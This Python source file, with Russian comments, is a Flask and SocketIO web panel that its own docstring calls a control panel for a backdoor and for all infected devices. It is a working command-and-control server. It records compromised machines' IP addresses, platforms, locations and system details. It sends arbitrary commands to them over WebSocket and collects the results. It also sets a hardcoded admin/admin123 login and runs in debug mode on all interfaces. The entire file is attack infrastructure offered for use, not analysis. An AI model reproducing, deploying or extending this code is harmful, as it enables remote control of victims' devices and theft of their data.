#!/usr/bin/env python3
"""
Веб-панель управления бэкдором
Бесплатный хостинг и управление всеми зараженными устройствами
"""

from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_socketio import SocketIO, emit
import sqlite3
import json
import os
import threading
import time
import logging
from datetime import datetime
import requests
from werkzeug.security import generate_password_hash, check_password_hash
import secrets

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(16)
socketio = SocketIO(app, cors_allowed_origins="*")

# База данных для хранения информации о устройствах
DB_PATH = 'devices.db'

def init_database():
    """Инициализация базы данных."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Таблица устройств
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY,
            name TEXT,
            ip_address TEXT,
            platform TEXT,
            status TEXT,
            last_seen TIMESTAMP,
            system_info TEXT,
            location TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица команд
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            status TEXT,
            result TEXT,
            executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (id)
        )
    ''')
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password_hash TEXT,
            role TEXT DEFAULT 'admin',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица аналитики
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS analytics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            action TEXT,
            data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (id)
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    """Получение соединения с базой данных."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Инициализация базы данных при запуске
init_database()

@app.route('/')
def index():
    """Главная страница."""
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Страница входа."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        conn = get_db_connection()
        user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        conn.close()
        
        if user and check_password_hash(user['password_hash'], password):
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['role'] = user['role']
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error='Неверные учетные данные')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Выход из системы."""
    session.clear()
    return redirect(url_for('login'))

@app.route('/api/devices')
def get_devices():
    """API для получения списка устройств."""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = get_db_connection()
    devices = conn.execute('SELECT * FROM devices ORDER BY last_seen DESC').fetchall()
    conn.close()
    
    return jsonify([dict(device) for device in devices])

@app.route('/api/device/<device_id>')
def get_device(device_id):
    """API для получения информации об устройстве."""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = get_db_connection()
    device = conn.execute('SELECT * FROM devices WHERE id = ?', (device_id,)).fetchone()
    commands = conn.execute('SELECT * FROM commands WHERE device_id = ? ORDER BY executed_at DESC LIMIT 50', (device_id,)).fetchall()
    conn.close()
    
    if device:
        return jsonify({
            'device': dict(device),
            'commands': [dict(cmd) for cmd in commands]
        })
    else:
        return jsonify({'error': 'Device not found'}), 404

@app.route('/api/command', methods=['POST'])
def execute_command():
    """API для выполнения команды."""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    device_id = data.get('device_id')
    command = data.get('command')
    
    if not device_id or not command:
        return jsonify({'error': 'Missing device_id or command'}), 400
    
    # Сохраняем команду в базу данных
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO commands (device_id, command, status, result)
        VALUES (?, ?, 'pending', '')
    ''', (device_id, command))
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    
    # Отправляем команду через WebSocket
    socketio.emit('execute_command', {
        'command_id': command_id,
        'device_id': device_id,
        'command': command
    })
    
    return jsonify({'success': True, 'command_id': command_id})

@app.route('/api/analytics')
def get_analytics():
    """API для получения аналитики."""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = get_db_connection()
    
    # Статистика устройств
    total_devices = conn.execute('SELECT COUNT(*) FROM devices').fetchone()[0]
    active_devices = conn.execute('SELECT COUNT(*) FROM devices WHERE status = "online"').fetchone()[0]
    
    # Статистика команд
    total_commands = conn.execute('SELECT COUNT(*) FROM commands').fetchone()[0]
    successful_commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "success"').fetchone()[0]
    
    # Активность по дням
    daily_activity = conn.execute('''
        SELECT DATE(executed_at) as date, COUNT(*) as count
        FROM commands
        WHERE executed_at >= datetime('now', '-7 days')
        GROUP BY DATE(executed_at)
        ORDER BY date
    ''').fetchall()
    
    conn.close()
    
    return jsonify({
        'devices': {
            'total': total_devices,
            'active': active_devices
        },
        'commands': {
            'total': total_commands,
            'successful': successful_commands
        },
        'daily_activity': [dict(day) for day in daily_activity]
    })

@socketio.on('connect')
def handle_connect():
    """Обработка подключения клиента."""
    logger.info(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Обработка отключения клиента."""
    logger.info(f"Client disconnected: {request.sid}")

@socketio.on('device_register')
def handle_device_register(data):
    """Регистрация нового устройства."""
    device_id = data.get('device_id')
    device_info = data.get('device_info')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Обновляем или создаем запись устройства
    cursor.execute('''
        INSERT OR REPLACE INTO devices 
        (id, name, ip_address, platform, status, last_seen, system_info, location)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        device_id,
        device_info.get('name', 'Unknown'),
        device_info.get('ip_address', ''),
        device_info.get('platform', ''),
        'online',
        datetime.now(),
        json.dumps(device_info),
        device_info.get('location', '')
    ))
    
    conn.commit()
    conn.close()
    
    # Уведомляем всех клиентов о новом устройстве
    socketio.emit('device_update', {'device_id': device_id, 'status': 'online'})

@socketio.on('command_result')
def handle_command_result(data):
    """Обработка результата выполнения команды."""
    command_id = data.get('command_id')
    result = data.get('result')
    status = data.get('status', 'success')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Обновляем результат команды
    cursor.execute('''
        UPDATE commands 
        SET status = ?, result = ?
        WHERE id = ?
    ''', (status, result, command_id))
    
    conn.commit()
    conn.close()
    
    # Уведомляем клиентов о результате
    socketio.emit('command_completed', {
        'command_id': command_id,
        'result': result,
        'status': status
    })

def create_admin_user():
    """Создание администратора по умолчанию."""
    conn = get_db_connection()
    admin = conn.execute('SELECT * FROM users WHERE username = "admin"').fetchone()
    
    if not admin:
        password_hash = generate_password_hash('admin123')
        conn.execute('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)',
                    ('admin', password_hash, 'admin'))
        conn.commit()
        logger.info("Admin user created: admin/admin123")
    
    conn.close()

if __name__ == '__main__':
    create_admin_user()
    logger.info("Starting web dashboard...")
    logger.info("Admin panel: http://localhost:5000")
    logger.info("Default credentials: admin/admin123")
    
    # Запуск в режиме разработки
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
